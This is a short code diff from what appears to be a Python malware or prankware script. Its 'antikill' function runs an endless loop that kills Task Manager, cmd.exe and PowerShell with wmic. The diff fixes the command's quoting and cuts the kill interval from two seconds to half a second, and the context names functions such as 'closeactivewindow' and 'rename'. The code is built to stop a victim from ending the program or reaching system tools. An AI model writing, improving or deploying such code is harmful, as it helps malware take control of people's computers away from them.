@@ -52,14 +52,15 @@ def closeactivewindow():
             continue
 
 def antikill():
+
     tokill = ["taskmgr.exe", "cmd.exe", "powershell.exe"]
     while True:
         for process in tokill:
             try:
-                subprocess.getoutput(f"wmic process where name={process} delete")
+                subprocess.getoutput(f"wmic process where name=\"{process}\" delete")
             except:
                 continue
-            time.sleep(2)
+            time.sleep(.5)
 
 def main():
     renamethread = threading.Thread(target=rename)
